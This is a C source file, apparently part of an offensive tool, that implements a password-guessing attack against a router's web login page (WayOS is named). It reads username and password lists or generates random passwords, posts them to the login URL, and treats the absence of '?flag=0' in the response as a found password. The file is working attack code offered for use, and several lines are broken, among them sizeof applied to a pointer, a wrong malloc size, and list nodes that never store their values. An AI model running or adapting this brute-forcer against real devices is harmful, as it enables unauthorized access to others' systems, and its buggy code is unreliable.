#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "../main.h"
#include "../core/debug.h"
#include "../core/cstring.h"
#include "../core/http.h"
#include "guess_username_password.h"

static int CheckResult(const char *lpbuf, char *rebuf, int debug_level)
{
    /*
     * This function will extract the response's transport data from server
     * If we found the 'flag=0'(mean uncorrect password or username) in data:
     *    Return 1;
     * Other program error:
     *    return -1;
     * If we have the RIGHT password and username(we will not found the 'flag=0' in data):
     *    return 0;
     */

    char *ptmp;
    char *response;
    ptmp = (char *)strstr(lpbuf, "HTTP/1.1");

    // WayOS not correct username and password also return the HTTP/1.1
    // If we could NOT found this string in response
    // It mean our targets is not rearchable
    if (!ptmp)
    {
        DisplayWarning("http/1.1 not found in server return data");
        return 1;
    }

    // Backward offset 9 characters will point to http status code
    // Extract ONLY the numbers from the last strings
    if (atoi(ptmp + 9) != 200)
    {
        DisplayDebug(DEBUG_LEVEL_1, debug_level, "result:\n%s", lpbuf);
        return 1;
    }

    // Discovery transport data in response
    ptmp = (char *)strstr(lpbuf, "\r\n\r\n");
    if (!ptmp)
    {
        DisplayDebug(DEBUG_LEVEL_1, debug_level, "Response data is NULL");
        return 1;
    }
    response = (char *)malloc((strlen(ptmp) + 1));
    if (!response)
    {
        DisplayError("malloc failed");
        return 1;
    }

    // ptmp point to the response's data
    strcpy(response, ptmp + 4);

    //printf("%lu\n", sizeof(response));
    //printf("%s\n", response);

    if (sizeof(response) > MAX_RECEIVE_DATA_SIZE)
    {
        DisplayERROR("the response data more than MAX_RECEIVE_DATA_SIZE: %d", MAX_RECEIVE_DATA_SIZE);
        return 1;
    }
    strcpy(rebuf, response);

    // Original code blow
    //return response;
    free(response);
    return 0;
}

static int SuccessOrNot(const int debug_level, const char *inbuf)
{
    /*
     * if we have the wrrong password or username
     * this fucntion will return 1
     * if we have the right password or username
     * this function will return 0
     * 
     * you should edit this function by your self
     */

    char *ptmp = NULL;
    ptmp = (char *)strstr(inbuf, "?flag=0");
    if (!ptmp)
    {
        // Not found the '?flag=0' in response mean successful
        return 0;
    }
    return 1;
}

int Attack_GuessUsernamePassword(const pInput process_result)
{

    /* attack mode guess the http web password */

    DisplayDebug(LOG_INFO, LOG_INFO, "Load guess attack module...");
    char username[MAX_USERNAME_LENGTH];
    char password[MAX_PASSWORD_LENGTH];
    char ch;
    char rebuf[SMALL_BUFFER_SIZE];
    char post_data[MAX_SEND_DATA_SIZE];
    pAttarckStruct attack_struct = (pAttarckStruct)malloc(sizeof(AttarckStruct));

    if (strlen(process_result->attack_mode_0_one_username) == 0)
    {
        if (strlen(process_result->attack_mode_0_username_file_path) == 0)
        {
            /* use the defalut usename */
            strncpy(attack_struct->username, USERNAME_DEFAULT, MAX_USERNAME_LENGTH);
            /* only use the one username */
            attack_struct->username_type = 0;
        }
        else
        {
            /* if user give the username.txt */
            FILE *fp = fopen(process_result->attack_mode_0_username_file_path, "r");
            if (!fp)
            {
                DisplayDebug(LOG_ERROR, LOG_ERROR, "Error: Can not open the username file");
                return 1;
            }
            /* use the linked list */
            pUsernameList_Header username_list_header = (pUsernameList_Header)malloc(sizeof(UsernameList_Header));
            username_list_header->length = 0;
            username_list_header->next = NULL;
            while (!feof(fp))
            {
                memset(username, 0, MAX_USERNAME_LENGTH);
                ch = fgetc(fp);
                while (ch != '\n' && ch != EOF)
                {
                    sprintf(username, "%s%c", username, ch);
                    ch = fgetc(fp);
                }
                pUsernameList username_linklist = (pUsernameList)malloc(sizeof(UsernameList));
                username_linklist->next = username_list_header->next;
                username_list_header->next = username_linklist;
                ++(username_list_header->length);
            }
            fclose(fp);
            attack_struct->username_list_header = username_list_header;
            /* use the muli-username-list */
            attack_struct->username_type = 1;
        }
    }
    else
        strncpy(attack_struct->username, process_result->attack_mode_0_one_username, MAX_USERNAME_LENGTH);
    DisplayDebug(LOG_DEBUG, process_result->debug_level, "username_type: %d\n", attack_struct->username_type);

    if (strlen(process_result->attack_mode_0_password_file_path) == 0)
    {
        /* use the random password */
        attack_struct->password_type = 0;
    }
    else
    {
        /* use the password file */
        FILE *fp = fopen(process_result->attack_mode_0_password_file_path, "r");
        if (!fp)
        {
            DisplayDebug(LOG_INFO, LOG_ERROR, "Error: Can not open the password file");
            return 1;
        }
        /* use the linked list */
        pPasswordList_Header password_list_header = (pPasswordList_Header)malloc(sizeof(PasswordList_Header));
        password_list_header->length = 0;
        password_list_header->next = NULL;
        while (!feof(fp))
        {
            memset(password, 0, MAX_PASSWORD_LENGTH);
            ch = fgetc(fp);
            while (ch != '\n' && ch != EOF)
            {
                sprintf(password, "%s%c", password, ch);
                ch = fgetc(fp);
            }
            pPasswordList password_linklist = (pPasswordList)malloc(sizeof(pPasswordList));
            password_linklist->next = password_linklist->next;
            password_list_header->next = password_linklist;
            ++(password_list_header->length);
        }
        fclose(fp);
        attack_struct->password_list_header = password_list_header;
        /* use the muli-username-list */
        attack_struct->password_type = 1;
    }
    DisplayDebug(LOG_DEBUG, process_result->debug_level, "password_type: %d\n", attack_struct->password_type);

    /* use the random pasword */
    if (attack_struct->password_type == 0)
    {
        /* use one username */
        if (attack_struct->username_type == 0)
        {
            /* get one random password every time */
            GetRandomPassword(attack_struct->password, process_result);
            sprintf(post_data, POST_DATA, attack_struct->username, attack_struct->password);

            strncpy(attack_struct->url, POST_URL, MAX_URL_LENGTH);
            strncpy(attack_struct->post_data, post_data, MAX_SEND_DATA_SIZE);

            HttpPostMethod(attack_struct, rebuf);
        }
    }

    DisplayDebug(LOG_DEBUG, process_result->debug_level, "Return value: %s", rebuf);

    // Guess the password
    DisplayDebug(LOG_DEBUG, process_result->debug_level, "Check success or not...");
    if (SuccessOrNot(process_result->debug_level, rebuf) == 0)
    {
        DisplayDebug(LOG_INFO, LOG_INFO, "Found the password");
        DisplayDebug(LOG_INFO, LOG_INFO, "[%s : %s]", attack_struct->username, attack_struct->password);
        return 1;
    }

    //pthread_exit((void *)0);
    return 0;
}

int main(void)
{
    /*
     * for the test, not use in the main code
     */

    char test_rebuf_GetRandomPassword[BIG_BUFFER_SIZE];
    pInput test_input_GetRandomPassword = (pInput)malloc(sizeof(Input));
    test_input_GetRandomPassword->debug_level = 2;
    test_input_GetRandomPassword->seed = 10;
    test_input_GetRandomPassword->random_password_length = 8;

    GetRandomPassword(test_rebuf_GetRandomPassword, test_input_GetRandomPassword);
    DisplayDebug(LOG_INFO, test_input_GetRandomPassword->debug_level, "random password: %s", test_rebuf_GetRandomPassword);

    return 0;
}